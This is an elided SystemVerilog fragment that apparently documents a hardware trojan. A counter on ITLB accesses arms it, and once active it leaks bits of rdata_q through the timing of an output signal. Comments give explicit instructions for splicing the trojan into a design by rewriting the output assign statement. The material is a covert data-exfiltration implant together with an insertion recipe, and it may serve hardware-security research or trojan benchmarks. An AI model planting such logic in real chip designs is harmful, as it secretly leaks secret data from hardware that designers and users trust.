 ...
 *   
 * Trigger: Counter on itlb_access_i
 * Payload: Modulate out timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |itlb_access_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of out:
...
logic       covert_bit_out;         // Drives out when trojan active
...
//   Find the assign for out (or rd_error_o as fallback):
//     assign out = <normal_expr>;
//   Replace with:
//     assign out = trojan_active ? covert_bit_out : (<normal_expr>);
//
